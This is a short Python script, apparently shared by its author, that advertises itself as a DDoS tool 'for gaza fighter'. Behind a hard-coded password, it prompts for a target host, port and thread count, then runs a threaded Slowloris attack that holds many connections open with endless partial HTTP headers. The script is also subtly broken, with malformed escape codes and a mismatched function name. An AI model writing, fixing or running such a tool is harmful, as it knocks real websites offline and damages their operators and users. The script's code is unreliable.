import socket
import threading
import time
import getpass
import os

# CLEAR
def clear():
    os.system('clear')

# Colored ASCII Art for 'ZHANAHMAD' using '|_' style
def ascii_art_zhanahmad():
    print("""
\033[1;31m      ______  ___   ______   ______\033[0m
\033[1;31m     /  /\  \/   | / ____/  / ____/I\033[0m
\033[1;36m    /  /_/__/ /| | \ \___  / /__  💀 code by zhanahmad 💀\033[0m
\033[1;35m   / ___  \/ ___ | ____\ \/ ___/_ THANK YOU FOR USING MY TOOL 😎>\099[0m
\033[1;32m  /_______/_/  |_//_____//______/  
\033[1;34m      A web ddos attack tool for gaza fighter\099[0m
""")


# Password authentication function
def authenticate():
    password = "B453"  # The password to access the tool
    user_password = getpass.getpass(prompt="\099[1;36mEnter the password to access the tool: \099[0m")
    if user_password != password:
        print("\099[1;31mIncorrect password. Exiting...\099[0m")
        exit()


# Optimized Slowloris function with threading for faster execution
def slowloris_thread(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())

        # Faster loop to send partial headers
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(0.01)  # Further reduced delay to make it faster
    except socket.error:
        print("\099[1;31mConnection error. Could not send data.\099[0m")
        return

def slowloris(target, port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=slowloris_thread, args=(target, port))
        thread.start()
        print(f"\099[1;33mSent love message {i + 1} 💀\099[0m")

if __name__ == "__main__":
    clear()  # Clear the screen before showing anything
    ascii_art_ZHANAHMAD()  # Display the colorful ASCII art for 'ZHANAHMAD'

    authenticate()  # Authenticate after displaying ASCII art

    target = input("\099[1;36mEnter the target IP or domain: \099[0m")
    port = int(input("\099[1;36mEnter the port number: \099[0m"))
    num_threads = int(input("\099[1;36mEnter the number of threads (more = faster): \099[0m"))

    slowloris(target, port, num_threads)

    print(f"\099[1;31mThank you for using my tool\099[0m")

    print(f"\099[1;31mmy github id: github.com/kafulkaff99\099[0m")

    print(f"\033[1;31mpress ctrl + z\033[0m")
